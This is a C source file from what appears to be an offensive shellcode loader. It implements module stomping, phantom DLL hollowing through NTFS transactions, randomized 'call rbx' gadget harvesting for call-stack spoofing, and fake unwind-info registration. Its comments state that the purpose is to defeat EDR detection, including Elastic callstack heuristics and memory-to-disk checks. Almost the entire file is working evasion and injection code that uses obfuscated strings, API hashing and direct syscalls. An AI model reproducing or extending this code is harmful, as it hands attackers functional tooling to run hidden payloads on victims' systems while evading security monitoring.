// =============================================
// Stomper.c - Module Stomping, Phantom DLL Hollowing,
//             Call Gadget Discovery,
//             Sliding Execution Window
// =============================================

#include "Common.h"

// -----------------------------------------------
// Call Gadget Pool — `call rbx` (FF D3) sites
// harvested from multiple signed system DLLs.
//
// SpoofCallback picks one per-run via RDTSC so the
// return address injected into the call stack is not
// the same bytes of ntdll every execution; this
// defeats EDR rules that flag "single return-address
// frequency" (Elastic 8.11+ callstack heuristics).
//
// Register is still rbx only — SpoofCallback's asm
// stub is hard-wired to `mov rbx, target; jmp gadget`.
// -----------------------------------------------
#define MAX_CALL_GADGETS 64
static struct {
    PVOID   pGadgets[MAX_CALL_GADGETS];
    DWORD   dwCount;
} g_CallGadgetPool = { 0 };

// Scan one module's executable sections for `call rbx`
// (FF D3) and append hits to the global pool.
static VOID ScanModuleForCallRbx(IN PVOID pModuleBase) {

    if (!pModuleBase)
        return;

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModuleBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
        return;

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE)
        return;

    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    for (WORD s = 0; s < pNt->FileHeader.NumberOfSections && g_CallGadgetPool.dwCount < MAX_CALL_GADGETS; s++) {
        if (!(pSec[s].Characteristics & IMAGE_SCN_MEM_EXECUTE))
            continue;

        PBYTE pStart = (PBYTE)pModuleBase + pSec[s].VirtualAddress;
        DWORD dwSize = pSec[s].Misc.VirtualSize;

        for (DWORD j = 0; j + 1 < dwSize && g_CallGadgetPool.dwCount < MAX_CALL_GADGETS; j++) {
            if (pStart[j] == 0xFF && pStart[j + 1] == 0xD3) {
                g_CallGadgetPool.pGadgets[g_CallGadgetPool.dwCount++] = (PVOID)(pStart + j);
            }
        }
    }
}

// Populate the pool from ntdll / kernel32 / kernelbase.
// All three are loaded in every x64 Windows process;
// additional modules could be added but returns diminish
// since the cap is 64 and ntdll alone usually saturates.
BOOL CollectCallGadgets(VOID) {

    g_CallGadgetPool.dwCount = 0;
    ScanModuleForCallRbx(FindLoadedModuleW(L"NTDLL.DLL"));
    ScanModuleForCallRbx(FindLoadedModuleW(L"KERNEL32.DLL"));
    ScanModuleForCallRbx(FindLoadedModuleW(L"KERNELBASE.DLL"));
    return g_CallGadgetPool.dwCount > 0;
}

// RDTSC-seeded random pick. Returns NULL if the pool is
// empty; SpoofCallback falls back to a direct tail-call.
PVOID GetRandomCallGadget(VOID) {

    if (g_CallGadgetPool.dwCount == 0)
        return NULL;
    DWORD idx = (DWORD)(__rdtsc() % g_CallGadgetPool.dwCount);
    return g_CallGadgetPool.pGadgets[idx];
}

// -----------------------------------------------
// Synthetic RUNTIME_FUNCTION registered with
// RtlAddFunctionTable after stomping. The kernel
// stores the pointer — it must have static lifetime.
//
// Elastic 8.11+ kernel ETW callstack validation flags
// frames whose RIP falls inside executable memory with
// no matching RUNTIME_FUNCTION entry. Registering a
// minimum-viable unwind descriptor for the stomped
// region makes RtlLookupFunctionEntry(rip) return a
// valid handle, satisfying the check. Accurate unwind
// isn't required — the stackwalker treats our region
// as a leaf function and walks past it to the (real)
// caller frame injected by the call-gadget spoof.
// -----------------------------------------------
static RUNTIME_FUNCTION g_StompRuntimeFunc = { 0 };

// -----------------------------------------------
// Module Stomping
// Loads a sacrificial DLL and overwrites its
// executable section with shellcode, so the
// shellcode memory is attributed to a signed DLL.
// After the overwrite, registers a synthetic
// RUNTIME_FUNCTION for the shellcode region.
//
// Memory protection is controlled by SHELLCODE_EXEC_PROT:
//   RWX_SHELLCODE defined:   PAGE_EXECUTE_READWRITE (Go/Sliver)
//   RWX_SHELLCODE undefined: PAGE_EXECUTE_READ (W^X)
// -----------------------------------------------
BOOL ModuleStomp(
    IN  PAPI_HASHING pApi,
    IN  PBYTE        pShellcode,
    IN  DWORD        dwShellcodeSize,
    OUT PVOID*       ppExecAddr
) {
    if (!pApi || !pShellcode || !ppExecAddr || dwShellcodeSize == 0)
        return FALSE;

    // Load sacrificial DLL (deobfuscated)
    BYTE xDll[] = XSTR_STOMP_DLL;
    DEOBF(xDll);
    HMODULE hModule = pApi->pLoadLibraryA((LPCSTR)xDll);
    if (!hModule) {
        LOG("[!] Module stomp: LoadLibrary failed");
        return FALSE;
    }
    LOG("[+] Module stomp: sacrificial DLL loaded");

    // Parse PE headers to find executable section
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hModule + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    PVOID  pTextBase = NULL;
    DWORD  dwTextSize = 0;

    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSection[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            pTextBase = (PVOID)((PBYTE)hModule + pSection[i].VirtualAddress);
            dwTextSize = pSection[i].Misc.VirtualSize;
            break;
        }
    }

    if (!pTextBase || dwTextSize < dwShellcodeSize) {
        LOG("[!] Module stomp: .text section too small or not found");
        return FALSE;
    }

    // Reserve 4 bytes (DWORD-aligned) after shellcode for minimum UNWIND_INFO
    DWORD dwUnwindOffset = (dwShellcodeSize + 3) & ~3u;
    DWORD dwWriteSize    = dwShellcodeSize;
    BOOL  bHasUnwindSlot = FALSE;
    if (dwTextSize >= dwUnwindOffset + sizeof(DWORD)) {
        dwWriteSize    = dwUnwindOffset + sizeof(DWORD);
        bHasUnwindSlot = TRUE;
    }

    // Change protection to RW for writing (covers shellcode + unwind slot)
    DWORD dwOldProtect = 0;
    if (!pApi->pVirtualProtect(pTextBase, (SIZE_T)dwWriteSize, PAGE_READWRITE, &dwOldProtect)) {
        LOG("[!] Module stomp: VirtualProtect(RW) failed");
        return FALSE;
    }

    // Overwrite .text with shellcode
    MemCopy(pTextBase, pShellcode, dwShellcodeSize);

    // Write minimum UNWIND_INFO (4 bytes): version=1, flags=0, prolog=0,
    // unwind-code-count=0, frame-register=0, frame-offset=0. Describes a
    // leaf function with no prologue — stackwalker will pop the return
    // address and continue to the caller frame without error.
    PBYTE pUnwindInfo = NULL;
    if (bHasUnwindSlot) {
        pUnwindInfo = (PBYTE)pTextBase + dwUnwindOffset;
        pUnwindInfo[0] = 0x01;  // Version (3 bits) + Flags (5 bits)
        pUnwindInfo[1] = 0x00;  // SizeOfProlog
        pUnwindInfo[2] = 0x00;  // CountOfUnwindCodes
        pUnwindInfo[3] = 0x00;  // FrameRegister (4 bits) + FrameOffset (4 bits)
    }

    // Set final execution protection (RX or RWX depending on build config)
    DWORD dwDummy = 0;
    if (!pApi->pVirtualProtect(pTextBase, (SIZE_T)dwWriteSize, SHELLCODE_EXEC_PROT, &dwDummy)) {
        LOG("[!] Module stomp: VirtualProtect(exec) failed");
        return FALSE;
    }

    // Register synthetic RUNTIME_FUNCTION so RtlLookupFunctionEntry(rip)
    // succeeds for the stomped region. Best-effort — stomp itself is
    // successful either way.
    if (bHasUnwindSlot) {
        typedef BOOLEAN(NTAPI * fnRtlAddFunctionTable)(PRUNTIME_FUNCTION, DWORD, DWORD64);
        fnRtlAddFunctionTable pAdd = (fnRtlAddFunctionTable)FetchExportAddress(
            FindLoadedModuleW(L"NTDLL.DLL"), RtlAddFunctionTable_JOAAT
        );
        if (pAdd) {
            g_StompRuntimeFunc.BeginAddress = (DWORD)((ULONG_PTR)pTextBase - (ULONG_PTR)hModule);
            g_StompRuntimeFunc.EndAddress   = g_StompRuntimeFunc.BeginAddress + dwShellcodeSize;
            g_StompRuntimeFunc.UnwindData   = (DWORD)((ULONG_PTR)pUnwindInfo - (ULONG_PTR)hModule);
            pAdd(&g_StompRuntimeFunc, 1, (DWORD64)hModule);
        }
    }

    *ppExecAddr = pTextBase;
    LOG("[+] Module stomp: shellcode planted in DLL .text section");
    return TRUE;
}

// -----------------------------------------------
// Scan System32 for a DLL suitable for hollowing:
//   - Not already loaded in this process
//   - Has an executable section >= dwMinSize
// Returns TRUE and fills pOutName with the filename.
// -----------------------------------------------
static BOOL FindSuitableDll(
    IN  PAPI_HASHING      pApi,
    IN  HMODULE           hK32,
    IN  fnCloseHandle2    pCloseHandle,
    IN  fnReadFile        pReadFile,
    IN  LPCSTR            szPrefix,
    IN  SIZE_T            nPre,
    IN  DWORD             dwMinSize,
    OUT PCHAR             pOutName
) {
    BYTE xFindFirst[] = XSTR_FIND_FIRST_FILE_A;
    DEOBF(xFindFirst);
    fnFindFirstFileA2 pFindFirst = (fnFindFirstFileA2)pApi->pGetProcAddress(hK32, (LPCSTR)xFindFirst);

    BYTE xFindNext[] = XSTR_FIND_NEXT_FILE_A;
    DEOBF(xFindNext);
    fnFindNextFileA2 pFindNext = (fnFindNextFileA2)pApi->pGetProcAddress(hK32, (LPCSTR)xFindNext);

    BYTE xFindClose[] = XSTR_FIND_CLOSE;
    DEOBF(xFindClose);
    fnFindClose2 pFindCloseFunc = (fnFindClose2)pApi->pGetProcAddress(hK32, (LPCSTR)xFindClose);

    BYTE xCreateFile[] = XSTR_CREATE_FILE_A;
    DEOBF(xCreateFile);
    fnCreateFileA2 pCreateFile = (fnCreateFileA2)pApi->pGetProcAddress(hK32, (LPCSTR)xCreateFile);

    if (!pFindFirst || !pFindNext || !pFindCloseFunc || !pCreateFile)
        return FALSE;

    // Build search pattern: C:\Windows\System32\*.dll
    BYTE xWild[] = XSTR_DLL_WILDCARD;
    DEOBF(xWild);

    CHAR szPattern[260];
    MemSet(szPattern, 0, sizeof(szPattern));
    MemCopy(szPattern, szPrefix, nPre);
    MemCopy(szPattern + nPre, xWild, StrLenA((LPCSTR)xWild));

    WIN32_FIND_DATAA fd;
    MemSet(&fd, 0, sizeof(fd));
    HANDLE hFind = pFindFirst(szPattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE)
        return FALSE;

    BOOL bFound = FALSE;

    do {
        // Skip if already loaded
        if (pApi->pGetModuleHandleA(fd.cFileName) != NULL)
            continue;

        // Build full path
        CHAR szFull[260];
        MemSet(szFull, 0, sizeof(szFull));
        SIZE_T nName = StrLenA(fd.cFileName);
        MemCopy(szFull, szPrefix, nPre);
        MemCopy(szFull + nPre, fd.cFileName, nName);

        // Open and check PE headers
        HANDLE hPe = pCreateFile(szFull, GENERIC_READ, FILE_SHARE_READ,
                                 NULL, OPEN_EXISTING, 0, NULL);
        if (hPe == INVALID_HANDLE_VALUE)
            continue;

        BYTE peHdr[1024];
        DWORD dwRead = 0;
        BOOL bOk = pReadFile(hPe, peHdr, sizeof(peHdr), &dwRead, NULL);
        pCloseHandle(hPe);

        if (!bOk || dwRead < sizeof(IMAGE_DOS_HEADER))
            continue;

        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)peHdr;
        if (pDos->e_magic != IMAGE_DOS_SIGNATURE) continue;

        PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(peHdr + pDos->e_lfanew);
        if ((PBYTE)pNt + sizeof(IMAGE_NT_HEADERS) > peHdr + dwRead) continue;
        if (pNt->Signature != IMAGE_NT_SIGNATURE) continue;

        PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
        for (WORD s = 0; s < pNt->FileHeader.NumberOfSections; s++) {
            if ((pSec[s].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
                pSec[s].SizeOfRawData >= dwMinSize) {
                MemCopy(pOutName, fd.cFileName, nName + 1);
                bFound = TRUE;
                break;
            }
        }
        if (bFound) break;
    } while (pFindNext(hFind, &fd));

    pFindCloseFunc(hFind);
    return bFound;
}

// -----------------------------------------------
// Phantom DLL Hollowing (NTFS Transactions)
//
// Creates a transacted copy of a sacrificial DLL,
// overwrites the .text section with shellcode in
// the transaction, creates an image section from
// the modified file, then rolls back the transaction.
//
// The section retains the modified content but the
// on-disk file is unchanged. EDR that compares
// memory to the backing file sees no mismatch
// because the section's FILE_OBJECT has the
// transacted (modified) data.
//
// Requires write access to the DLL file path.
// Falls back gracefully if permissions are insufficient.
// -----------------------------------------------
BOOL PhantomDllHollow(
    IN  PAPI_HASHING pApi,
    IN  PNTAPI_FUNC  pNtApis,
    IN  PBYTE        pShellcode,
    IN  DWORD        dwShellcodeSize,
    OUT PVOID*       ppExecAddr
) {
    if (!pApi || !pNtApis || !pShellcode || !ppExecAddr || dwShellcodeSize == 0)
        return FALSE;

    NTSTATUS STATUS = 0;

    // --- Resolve kernel32 base ---

    BYTE xK32[] = XSTR_KERNEL32_DLL;
    DEOBF(xK32);
    HMODULE hK32 = pApi->pGetModuleHandleA((LPCSTR)xK32);
    if (!hK32)
        return FALSE;

    // --- Resolve all needed APIs ---

    fnReadFile pReadFile = (fnReadFile)FetchExportAddress((PVOID)hK32, ReadFile_JOAAT);
    fnWriteFile2 pWriteFile = (fnWriteFile2)FetchExportAddress((PVOID)hK32, WriteFile_JOAAT);
    fnSetFilePointer pSetFilePointer = (fnSetFilePointer)FetchExportAddress((PVOID)hK32, SetFilePointer_JOAAT);
    fnCloseHandle2 pCloseHandle = (fnCloseHandle2)FetchExportAddress((PVOID)hK32, CloseHandle_JOAAT);
    if (!pReadFile || !pWriteFile || !pSetFilePointer || !pCloseHandle)
        return FALSE;

    BYTE xCreateFileTx[] = XSTR_CREATE_FILE_TXA;
    DEOBF(xCreateFileTx);
    fnCreateFileTransactedA pCreateFileTx =
        (fnCreateFileTransactedA)pApi->pGetProcAddress(hK32, (LPCSTR)xCreateFileTx);

    BYTE xGetTemp[] = XSTR_GET_TEMP_PATH_A;
    DEOBF(xGetTemp);
    fnGetTempPathA2 pGetTempPath = (fnGetTempPathA2)pApi->pGetProcAddress(hK32, (LPCSTR)xGetTemp);

    BYTE xCopyFile[] = XSTR_COPY_FILE_A;
    DEOBF(xCopyFile);
    fnCopyFileA2 pCopyFile = (fnCopyFileA2)pApi->pGetProcAddress(hK32, (LPCSTR)xCopyFile);

    if (!pCreateFileTx || !pGetTempPath || !pCopyFile)
        return FALSE;

    // --- Scan System32 for suitable DLL ---

    BYTE xPrefix[] = XSTR_SYS32_PREFIX;
    DEOBF(xPrefix);
    SIZE_T nPre = StrLenA((LPCSTR)xPrefix);

    CHAR szChosenDll[260];
    MemSet(szChosenDll, 0, sizeof(szChosenDll));

    if (!FindSuitableDll(pApi, hK32, pCloseHandle, pReadFile,
                         (LPCSTR)xPrefix, nPre, dwShellcodeSize, szChosenDll)) {
        LOG("[!] Phantom: no suitable DLL found in System32");
        return FALSE;
    }
    LOG("[+] Phantom: selected DLL for hollowing");

    // --- Copy chosen DLL to temp ---

    CHAR szSrcPath[260];
    MemSet(szSrcPath, 0, sizeof(szSrcPath));
    SIZE_T nDll = StrLenA(szChosenDll);
    MemCopy(szSrcPath, xPrefix, nPre);
    MemCopy(szSrcPath + nPre, szChosenDll, nDll);

    CHAR szPath[260];
    MemSet(szPath, 0, sizeof(szPath));
    DWORD dwTempLen = pGetTempPath(sizeof(szPath), szPath);
    if (dwTempLen == 0)
        return FALSE;
    MemCopy(szPath + dwTempLen, szChosenDll, nDll);

    if (!pCopyFile(szSrcPath, szPath, FALSE)) {
        LOG("[!] Phantom: CopyFile to temp failed");
        return FALSE;
    }
    LOG("[+] Phantom: DLL copied to temp");

    // --- Load ktmw32.dll and resolve TxF APIs ---

    BYTE xKtm[] = XSTR_KTMW32_DLL;
    DEOBF(xKtm);
    HMODULE hKtm = pApi->pLoadLibraryA((LPCSTR)xKtm);
    if (!hKtm)
        return FALSE;

    BYTE xCreateTx[] = XSTR_CREATE_TRANSACTION;
    DEOBF(xCreateTx);
    fnCreateTransaction pCreateTx =
        (fnCreateTransaction)pApi->pGetProcAddress(hKtm, (LPCSTR)xCreateTx);
    if (!pCreateTx)
        return FALSE;

    BYTE xRollback[] = XSTR_ROLLBACK_TRANSACTION;
    DEOBF(xRollback);
    fnRollbackTransaction pRollback =
        (fnRollbackTransaction)pApi->pGetProcAddress(hKtm, (LPCSTR)xRollback);
    if (!pRollback)
        return FALSE;

    // --- Create transaction ---

    HANDLE hTx = pCreateTx(NULL, NULL, 0, 0, 0, 0, NULL);
    if (hTx == INVALID_HANDLE_VALUE) {
        LOG("[!] Phantom: CreateTransaction failed");
        return FALSE;
    }

    // --- Open DLL file within the transaction (read + write) ---

    HANDLE hFile = pCreateFileTx(
        szPath,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTx,
        NULL,
        NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        LOG("[!] Phantom: CreateFileTransacted failed (permissions?)");
        pRollback(hTx);
        pCloseHandle(hTx);
        return FALSE;
    }

    LOG("[+] Phantom: transacted file opened");

    // --- Read PE headers from the transacted file ---
    // We need to find the .text section's PointerToRawData and VirtualAddress

    BYTE peHeader[1024];
    DWORD dwBytesRead = 0;
    if (!pReadFile(hFile, peHeader, sizeof(peHeader), &dwBytesRead, NULL) || dwBytesRead < sizeof(IMAGE_DOS_HEADER)) {
        pCloseHandle(hFile);
        pRollback(hTx);
        pCloseHandle(hTx);
        return FALSE;
    }

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)peHeader;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
        pCloseHandle(hFile);
        pRollback(hTx);
        pCloseHandle(hTx);
        return FALSE;
    }

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(peHeader + pDos->e_lfanew);
    if ((PBYTE)pNt + sizeof(IMAGE_NT_HEADERS) > peHeader + dwBytesRead) {
        pCloseHandle(hFile);
        pRollback(hTx);
        pCloseHandle(hTx);
        return FALSE;
    }
    if (pNt->Signature != IMAGE_NT_SIGNATURE) {
        pCloseHandle(hFile);
        pRollback(hTx);
        pCloseHandle(hTx);
        return FALSE;
    }

    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    DWORD dwTextRawOffset = 0;
    DWORD dwTextRawSize   = 0;
    DWORD dwTextVA        = 0;

    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            dwTextRawOffset = pSec[i].PointerToRawData;
            dwTextRawSize   = pSec[i].SizeOfRawData;
            dwTextVA        = pSec[i].VirtualAddress;
            break;
        }
    }

    if (dwTextRawSize < dwShellcodeSize) {
        LOG("[!] Phantom: .text too small for shellcode");
        pCloseHandle(hFile);
        pRollback(hTx);
        pCloseHandle(hTx);
        return FALSE;
    }

    // --- Seek to .text section's raw data offset ---

    pSetFilePointer(hFile, (LONG)dwTextRawOffset, NULL, 0 /*FILE_BEGIN*/);

    // --- Write shellcode at .text offset in transacted file ---

    DWORD dwWritten = 0;
    if (!pWriteFile(hFile, pShellcode, dwShellcodeSize, &dwWritten, NULL) || dwWritten != dwShellcodeSize) {
        LOG("[!] Phantom: WriteFile failed");
        pCloseHandle(hFile);
        pRollback(hTx);
        pCloseHandle(hTx);
        return FALSE;
    }

    LOG("[+] Phantom: shellcode written to transacted .text");

    // --- Create image section from the transacted file ---
    // The section sees the modified content (with our shellcode)

    HANDLE hSection = NULL;
    SET_SYSCALL(pNtApis->NtCreateSection);
    STATUS = RunSyscall(
        (ULONG_PTR)&hSection,
        (ULONG_PTR)0x000F001F,     // SECTION_ALL_ACCESS
        (ULONG_PTR)0,              // NULL ObjectAttributes
        (ULONG_PTR)0,              // NULL MaximumSize (file-backed)
        (ULONG_PTR)PAGE_READONLY,
        (ULONG_PTR)0x01000000,     // SEC_IMAGE
        (ULONG_PTR)hFile,
        0, 0, 0, 0, 0
    );
    if (!NT_SUCCESS(STATUS)) {
        LOG_STATUS("[!] Phantom: NtCreateSection failed", STATUS);
        pCloseHandle(hFile);
        pRollback(hTx);
        pCloseHandle(hTx);
        return FALSE;
    }

    // --- Close file handle (section holds its own reference) ---
    pCloseHandle(hFile);

    // --- Rollback transaction: on-disk file is unchanged ---
    // The section retains the modified content

    pRollback(hTx);
    pCloseHandle(hTx);
    LOG("[+] Phantom: transaction rolled back (file clean)");

    // --- Map the section into our process ---

    PVOID  pBase    = NULL;
    SIZE_T viewSize = 0;
    SET_SYSCALL(pNtApis->NtMapViewOfSection);
    STATUS = RunSyscall(
        (ULONG_PTR)hSection,
        (ULONG_PTR)(HANDLE)-1,     // Current process
        (ULONG_PTR)&pBase,
        (ULONG_PTR)0,              // ZeroBits
        (ULONG_PTR)0,              // CommitSize
        (ULONG_PTR)0,              // SectionOffset = NULL
        (ULONG_PTR)&viewSize,
        (ULONG_PTR)1,              // ViewShare
        (ULONG_PTR)0,              // AllocationType
        (ULONG_PTR)PAGE_READONLY,
        0, 0
    );
    if (!NT_SUCCESS(STATUS)) {
        LOG_STATUS("[!] Phantom: NtMapViewOfSection failed", STATUS);
        pCloseHandle(hSection);
        return FALSE;
    }

    // Section handle no longer needed after mapping
    pCloseHandle(hSection);

    // --- Change .text protection to executable ---
    // SEC_IMAGE maps with PE section header protections (typically RX).
    // SHELLCODE_EXEC_PROT selects RX or RWX based on build config.

    PVOID  pTextAddr  = (PVOID)((PBYTE)pBase + dwTextVA);
    SIZE_T sProtSize  = (SIZE_T)dwShellcodeSize;
    ULONG  dwOldProt  = 0;

    SET_SYSCALL(pNtApis->NtProtectVirtualMemory);
    STATUS = RunSyscall(
        (ULONG_PTR)(HANDLE)-1,
        (ULONG_PTR)&pTextAddr,
        (ULONG_PTR)&sProtSize,
        (ULONG_PTR)SHELLCODE_EXEC_PROT,
        (ULONG_PTR)&dwOldProt,
        0, 0, 0, 0, 0, 0, 0
    );
    if (!NT_SUCCESS(STATUS)) {
        LOG_STATUS("[!] Phantom: NtProtectVirtualMemory failed", STATUS);
        return FALSE;
    }

    *ppExecAddr = (PVOID)((PBYTE)pBase + dwTextVA);
    LOG("[+] Phantom DLL hollowing: shellcode mapped via transacted section");
    return TRUE;
}

